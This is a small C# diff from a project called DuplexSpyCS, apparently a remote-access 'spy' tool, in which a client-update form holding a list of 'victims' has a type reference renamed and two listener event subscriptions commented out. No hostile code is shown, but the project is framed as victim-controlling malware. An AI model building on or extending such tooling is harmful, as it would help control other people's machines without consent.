@@ -13,7 +13,7 @@ namespace DuplexSpyCS
     public partial class frmClntUpdate : Form
     {
         public List<clsVictim> m_lsVictim;
-        public Form1 frmMain;
+        public frmMain frmMain;
 
         public frmClntUpdate()
         {
@@ -59,7 +59,7 @@ namespace DuplexSpyCS
 
             toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
 
-            frmMain.listener.ReceivedDecoded += Received;
+            //frmMain.listener.ReceivedDecoded += Received;
         }
 
         private void frmClntUpdate_Load(object sender, EventArgs e)
@@ -107,7 +107,7 @@ namespace DuplexSpyCS
 
         private void frmClntUpdate_FormClosed(object sender, FormClosedEventArgs e)
         {
-            frmMain.listener.ReceivedDecoded -= Received;
+            //frmMain.listener.ReceivedDecoded -= Received;
         }
 
         private void button4_Click(object sender, EventArgs e)
